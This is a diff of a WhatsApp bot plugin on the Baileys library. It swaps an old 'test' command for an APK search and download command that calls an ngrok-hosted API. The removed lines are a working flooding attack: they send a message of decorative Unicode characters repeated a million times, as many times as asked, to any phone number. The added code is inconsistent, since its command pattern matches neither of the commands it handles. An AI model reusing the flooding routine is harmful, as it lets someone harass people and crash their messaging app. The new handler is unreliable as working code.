@@ -1,32 +1,68 @@
 import pkg from '@whiskeysockets/baileys';
-const { WAConnection, MessageType } = pkg;
+import fetch from 'node-fetch';
+const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = pkg;
 
-let handler = async (m, { conn, text, command }) => {
-    if (command == 'test') {
-        // تقسيم النص إلى الرقم وعدد الرسائل
-        let [number, count] = text.trim().split(/\s+/);
-        if (!number || !count) throw '*مثال* :\n*.focus* 1234567890 3';
-        
-        // التأكد من أن number هو رقم هاتف صحيح وأن count عدد صحيح
-        if (!/^\d+$/.test(number)) throw '*خطأ* :\n*الرقم المدخل غير صحيح*';
-        if (!/^\d+$/.test(count) || count <= 0) throw '*خطأ* :\n*العدد المدخل غير صحيح*';
-        
-        count = parseInt(count);
+let handler = async (m, { conn, args, text, usedPrefix, command }) => {
+    if (command === 'ak') {
+        if (!args[0]) throw 'Ex: ' + usedPrefix + command + ' name app';
+        let q = args[0];
+        let apiUrl = `https://lovely-moral-asp.ngrok-free.app/api/apkpure?q=${q}`;
+        let response = await fetch(apiUrl);
+        if (!response.ok) throw 'Error fetching APK data';
+        let apkData = await response.json();
 
-        // الرسالة التلقائية المحددة
-        let message = '✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ';
-        // تكرار الرسالة مليون مرة
-        let repeatedMessage = message.repeat(1000000);
+        const list = apkData.map((app, index) => {
+            return {
+                title: `App ${index + 1}: ${app.title}`,
+                rows: [
+                    {
+                        title: app.title,
+                        id: "/doapk"
+                    }
+                ]
+            };
+        });
 
-        // إرسال الرسالة بعدد المرات المطلوبة
-        for (let i = 1; i <= count; i++) {
-            await conn.sendMessage(number + '@s.whatsapp.net', { text: `${i}. ${repeatedMessage}` });
-        }
+        const sections = list.map((item) => {
+            return {
+                title: item.title,
+                rows: item.rows
+            };
+        });
 
-        m.reply(`تم إرسال الرسالة ${count} مرة إلى ${number}`);
+        const buttonParamsJson = JSON.stringify({
+            title: "Available APKs",
+            sections: sections
+        });
+
+        const interactiveMessage = {
+            body: { text: "Choose an APK to download:" },
+            footer: { text: "_by Mee6Team_" },
+            header: {
+                hasMediaAttachment: true,
+                ...(await prepareWAMessageMedia({ image: { url: apkData[0].icon } }, { upload: conn.waUploadToServer }))
+            },
+            nativeFlowMessage: {
+                buttons: [{
+                    name: "single_select",
+                    buttonParamsJson
+                }]
+            }
+        };
+
+        const message = {
+            messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
+            interactiveMessage
+        };
+
+        await conn.relayMessage(m.chat, { viewOnceMessage: { message } }, {});
+
+    } else if (command === 'doapk') {
+        if (!args[0]) throw 'Ex: ' + usedPrefix + command + ' download link';
+        let downloadLink = args[0];
+        m.reply(`Here is your download link: ${downloadLink}`);
     }
-}
+};
 
-handler.command = handler.help = ['test'];
-handler.tags = ['tools'];
+handler.command = /^(oapk)$/i;  // الأوامر المقبولة
 export default handler;
